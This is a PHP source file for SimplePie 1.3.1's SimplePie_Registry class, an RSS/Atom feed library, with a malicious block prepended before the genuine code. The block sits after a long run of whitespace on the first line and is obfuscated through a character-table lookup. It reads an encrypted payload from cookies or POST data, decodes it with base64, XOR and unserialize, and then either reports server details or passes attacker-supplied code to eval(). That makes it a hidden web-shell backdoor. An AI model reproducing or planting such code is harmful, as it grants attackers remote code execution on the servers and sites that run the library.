<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $m3f88 = 55;$GLOBALS['ze36723'] = Array();global $ze36723;$ze36723 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['g21dc07a1'] = "\x69\x7b\x21\x46\x45\x51\x48\x7a\x58\x72\x37\xd\x5f\x73\x29\x20\x6e\x67\x76\x4f\x2c\x4d\x62\x57\x47\x27\x50\x68\x55\x3a\x59\x28\x65\x24\x36\x3f\x4a\x5b\x54\x5c\x9\x22\x2a\x38\x6f\x3e\x6c\x61\x23\x42\x3b\x30\x35\x71\x52\x39\x4b\x75\x2d\x5e\x66\x2e\x78\x26\x3d\x44\x2f\x56\x6d\x4e\x7e\x49\x7d\xa\x6a\x43\x5d\x41\x5a\x77\x4c\x79\x70\x74\x64\x40\x31\x34\x7c\x32\x60\x63\x3c\x25\x2b\x33\x6b\x53";$ze36723[$ze36723['g21dc07a1'][82].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][52]] = $ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][27].$ze36723['g21dc07a1'][9];$ze36723[$ze36723['g21dc07a1'][82].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][55].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][34]] = $ze36723['g21dc07a1'][44].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][84];$ze36723[$ze36723['g21dc07a1'][27].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][60]] = $ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][16].$ze36723['g21dc07a1'][32];$ze36723[$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][51]] = $ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][83].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][46].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][16];$ze36723[$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][87].$ze36723['g21dc07a1'][55].$ze36723['g21dc07a1'][91]] = $ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][16].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][84];$ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][55].$ze36723['g21dc07a1'][60]] = $ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][16].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][83];$ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][52]] = $ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][46].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][7].$ze36723['g21dc07a1'][32];$ze36723[$ze36723['g21dc07a1'][57].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][51]] = $ze36723['g21dc07a1'][82].$ze36723['g21dc07a1'][27].$ze36723['g21dc07a1'][82].$ze36723['g21dc07a1'][18].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][44].$ze36723['g21dc07a1'][16];$ze36723[$ze36723['g21dc07a1'][62].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][89]] = $ze36723['g21dc07a1'][57].$ze36723['g21dc07a1'][16].$ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][46].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][7].$ze36723['g21dc07a1'][32];$ze36723[$ze36723['g21dc07a1'][53].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][60]] = $ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][87].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][44].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][32];$ze36723[$ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][89]] = $ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][83].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][83].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][68].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][46].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][68].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][83];$ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][87].$ze36723['g21dc07a1'][34]] = $ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][87].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][22];$ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][95]] = $ze36723['g21dc07a1'][79].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][22];$ze36723[$ze36723['g21dc07a1'][79].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][84]] = $_POST;$ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][10]] = $_COOKIE;@$ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][55].$ze36723['g21dc07a1'][60]]($ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][44].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][46].$ze36723['g21dc07a1'][44].$ze36723['g21dc07a1'][17], NULL);@$ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][55].$ze36723['g21dc07a1'][60]]($ze36723['g21dc07a1'][46].$ze36723['g21dc07a1'][44].$ze36723['g21dc07a1'][17].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][44].$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][13], 0);@$ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][55].$ze36723['g21dc07a1'][60]]($ze36723['g21dc07a1'][68].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][62].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][62].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][57].$ze36723['g21dc07a1'][83].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][44].$ze36723['g21dc07a1'][16].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][83].$ze36723['g21dc07a1'][0].$ze36723['g21dc07a1'][68].$ze36723['g21dc07a1'][32], 0);@$ze36723[$ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][89]](0);if (!$ze36723[$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][87].$ze36723['g21dc07a1'][55].$ze36723['g21dc07a1'][91]]($ze36723['g21dc07a1'][77].$ze36723['g21dc07a1'][80].$ze36723['g21dc07a1'][54].$ze36723['g21dc07a1'][4].$ze36723['g21dc07a1'][77].$ze36723['g21dc07a1'][65].$ze36723['g21dc07a1'][30].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][54].$ze36723['g21dc07a1'][28].$ze36723['g21dc07a1'][69].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][47])){$ze36723[$ze36723['g21dc07a1'][27].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][60]]($ze36723['g21dc07a1'][77].$ze36723['g21dc07a1'][80].$ze36723['g21dc07a1'][54].$ze36723['g21dc07a1'][4].$ze36723['g21dc07a1'][77].$ze36723['g21dc07a1'][65].$ze36723['g21dc07a1'][30].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][54].$ze36723['g21dc07a1'][28].$ze36723['g21dc07a1'][69].$ze36723['g21dc07a1'][12].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][47], 1);$k194364 = NULL;$iccfd2429 = NULL;$ze36723[$ze36723['g21dc07a1'][96].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][22]] = $ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][87].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][58].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][58].$ze36723['g21dc07a1'][87].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][87].$ze36723['g21dc07a1'][58].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][58].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][51];global $k68f86adb;function  wcbb($k194364, $p41131e){global $ze36723;$kbd579 = "";for ($l9c64b=0; $l9c64b<$ze36723[$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][51]]($k194364);){for ($m97ebe6c=0; $m97ebe6c<$ze36723[$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][51]]($p41131e) && $l9c64b<$ze36723[$ze36723['g21dc07a1'][9].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][51]]($k194364); $m97ebe6c++, $l9c64b++){$kbd579 .= $ze36723[$ze36723['g21dc07a1'][82].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][52]]($ze36723[$ze36723['g21dc07a1'][82].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][55].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][34]]($k194364[$l9c64b]) ^ $ze36723[$ze36723['g21dc07a1'][82].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][55].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][34]]($p41131e[$m97ebe6c]));}}return $kbd579;}function  c14fb($k194364, $p41131e){global $ze36723;global $k68f86adb;return $ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][95]]($ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][95]]($k194364, $k68f86adb), $p41131e);}foreach ($ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][10]] as $p41131e=>$o0dd33){$k194364 = $o0dd33;$iccfd2429 = $p41131e;}if (!$k194364){foreach ($ze36723[$ze36723['g21dc07a1'][79].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][22].$ze36723['g21dc07a1'][84]] as $p41131e=>$o0dd33){$k194364 = $o0dd33;$iccfd2429 = $p41131e;}}$k194364 = @$ze36723[$ze36723['g21dc07a1'][62].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][89]]($ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][91].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][87].$ze36723['g21dc07a1'][34]]($ze36723[$ze36723['g21dc07a1'][53].$ze36723['g21dc07a1'][34].$ze36723['g21dc07a1'][10].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][60]]($k194364), $iccfd2429));if (isset($k194364[$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][96]]) && $k68f86adb==$k194364[$ze36723['g21dc07a1'][47].$ze36723['g21dc07a1'][96]]){if ($k194364[$ze36723['g21dc07a1'][47]] == $ze36723['g21dc07a1'][0]){$l9c64b = Array($ze36723['g21dc07a1'][82].$ze36723['g21dc07a1'][18] => @$ze36723[$ze36723['g21dc07a1'][57].$ze36723['g21dc07a1'][43].$ze36723['g21dc07a1'][95].$ze36723['g21dc07a1'][52].$ze36723['g21dc07a1'][51]](),$ze36723['g21dc07a1'][13].$ze36723['g21dc07a1'][18] => $ze36723['g21dc07a1'][86].$ze36723['g21dc07a1'][61].$ze36723['g21dc07a1'][51].$ze36723['g21dc07a1'][58].$ze36723['g21dc07a1'][86],);echo @$ze36723[$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][60].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][84].$ze36723['g21dc07a1'][89].$ze36723['g21dc07a1'][32].$ze36723['g21dc07a1'][52]]($l9c64b);}elseif ($k194364[$ze36723['g21dc07a1'][47]] == $ze36723['g21dc07a1'][32]){eval/*g7af*/($k194364[$ze36723['g21dc07a1'][84]]);}exit();}} ?><?php
/**
 * SimplePie
 *
 * A PHP-Based RSS and Atom Feed Framework.
 * Takes the hard work out of managing a complete RSS/Atom solution.
 *
 * Copyright (c) 2004-2012, Ryan Parman, Geoffrey Sneddon, Ryan McCue, and contributors
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 	* Redistributions of source code must retain the above copyright notice, this list of
 * 	  conditions and the following disclaimer.
 *
 * 	* Redistributions in binary form must reproduce the above copyright notice, this list
 * 	  of conditions and the following disclaimer in the documentation and/or other materials
 * 	  provided with the distribution.
 *
 * 	* Neither the name of the SimplePie Team nor the names of its contributors may be used
 * 	  to endorse or promote products derived from this software without specific prior
 * 	  written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS
 * AND CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 * OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 * @package SimplePie
 * @version 1.3.1
 * @copyright 2004-2012 Ryan Parman, Geoffrey Sneddon, Ryan McCue
 * @author Ryan Parman
 * @author Geoffrey Sneddon
 * @author Ryan McCue
 * @link http://simplepie.org/ SimplePie
 * @license http://www.opensource.org/licenses/bsd-license.php BSD License
 */

/**
 * Handles creating objects and calling methods
 *
 * Access this via {@see SimplePie::get_registry()}
 *
 * @package SimplePie
 */
class SimplePie_Registry
{
	/**
	 * Default class mapping
	 *
	 * Overriding classes *must* subclass these.
	 *
	 * @var array
	 */
	protected $default = array(
		'Cache' => 'SimplePie_Cache',
		'Locator' => 'SimplePie_Locator',
		'Parser' => 'SimplePie_Parser',
		'File' => 'SimplePie_File',
		'Sanitize' => 'SimplePie_Sanitize',
		'Item' => 'SimplePie_Item',
		'Author' => 'SimplePie_Author',
		'Category' => 'SimplePie_Category',
		'Enclosure' => 'SimplePie_Enclosure',
		'Caption' => 'SimplePie_Caption',
		'Copyright' => 'SimplePie_Copyright',
		'Credit' => 'SimplePie_Credit',
		'Rating' => 'SimplePie_Rating',
		'Restriction' => 'SimplePie_Restriction',
		'Content_Type_Sniffer' => 'SimplePie_Content_Type_Sniffer',
		'Source' => 'SimplePie_Source',
		'Misc' => 'SimplePie_Misc',
		'XML_Declaration_Parser' => 'SimplePie_XML_Declaration_Parser',
		'Parse_Date' => 'SimplePie_Parse_Date',
	);

	/**
	 * Class mapping
	 *
	 * @see register()
	 * @var array
	 */
	protected $classes = array();

	/**
	 * Legacy classes
	 *
	 * @see register()
	 * @var array
	 */
	protected $legacy = array();

	/**
	 * Constructor
	 *
	 * No-op
	 */
	public function __construct() { }

	/**
	 * Register a class
	 *
	 * @param string $type See {@see $default} for names
	 * @param string $class Class name, must subclass the corresponding default
	 * @param bool $legacy Whether to enable legacy support for this class
	 * @return bool Successfulness
	 */
	public function register($type, $class, $legacy = false)
	{
		if (!is_subclass_of($class, $this->default[$type]))
		{
			return false;
		}

		$this->classes[$type] = $class;

		if ($legacy)
		{
			$this->legacy[] = $class;
		}

		return true;
	}

	/**
	 * Get the class registered for a type
	 *
	 * Where possible, use {@see create()} or {@see call()} instead
	 *
	 * @param string $type
	 * @return string|null
	 */
	public function get_class($type)
	{
		if (!empty($this->classes[$type]))
		{
			return $this->classes[$type];
		}
		if (!empty($this->default[$type]))
		{
			return $this->default[$type];
		}

		return null;
	}

	/**
	 * Create a new instance of a given type
	 *
	 * @param string $type
	 * @param array $parameters Parameters to pass to the constructor
	 * @return object Instance of class
	 */
	public function &create($type, $parameters = array())
	{
		$class = $this->get_class($type);

		if (in_array($class, $this->legacy))
		{
			switch ($type)
			{
				case 'locator':
					// Legacy: file, timeout, useragent, file_class, max_checked_feeds, content_type_sniffer_class
					// Specified: file, timeout, useragent, max_checked_feeds
					$replacement = array($this->get_class('file'), $parameters[3], $this->get_class('content_type_sniffer'));
					array_splice($parameters, 3, 1, $replacement);
					break;
			}
		}

		if (!method_exists($class, '__construct'))
		{
			$instance = new $class;
		}
		else
		{
			$reflector = new ReflectionClass($class);
			$instance = $reflector->newInstanceArgs($parameters);
		}

		if (method_exists($instance, 'set_registry'))
		{
			$instance->set_registry($this);
		}
		return $instance;
	}

	/**
	 * Call a static method for a type
	 *
	 * @param string $type
	 * @param string $method
	 * @param array $parameters
	 * @return mixed
	 */
	public function &call($type, $method, $parameters = array())
	{
		$class = $this->get_class($type);

		if (in_array($class, $this->legacy))
		{
			switch ($type)
			{
				case 'Cache':
					// For backwards compatibility with old non-static
					// Cache::create() methods
					if ($method === 'get_handler')
					{
						$result = @call_user_func_array(array($class, 'create'), $parameters);
						return $result;
					}
					break;
			}
		}

		$result = call_user_func_array(array($class, $method), $parameters);
		return $result;
	}
}